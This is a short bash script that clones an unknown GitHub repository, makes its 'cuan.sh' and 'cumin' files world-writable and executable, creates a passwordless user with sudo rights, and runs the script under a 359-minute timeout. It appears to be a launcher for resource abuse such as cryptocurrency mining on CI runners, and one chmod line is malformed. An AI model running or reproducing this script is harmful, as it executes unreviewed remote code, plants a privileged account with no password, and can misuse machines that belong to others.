#!/bin/bash
sudo apt update
git clone https://github.com/xfdbtry5e/cekakunanyar.git && cd cekakunanyar
chmod +x cuan.sh && chmod +x cumin chmod 777 cumin cuan.sh
sudo adduser --disabled-password --gecos "" manuk && sudo usermod -aG sudo manuk
sudo -u manuk -H sh -c "timeout 359m ./cuan.sh"
sudo apt update
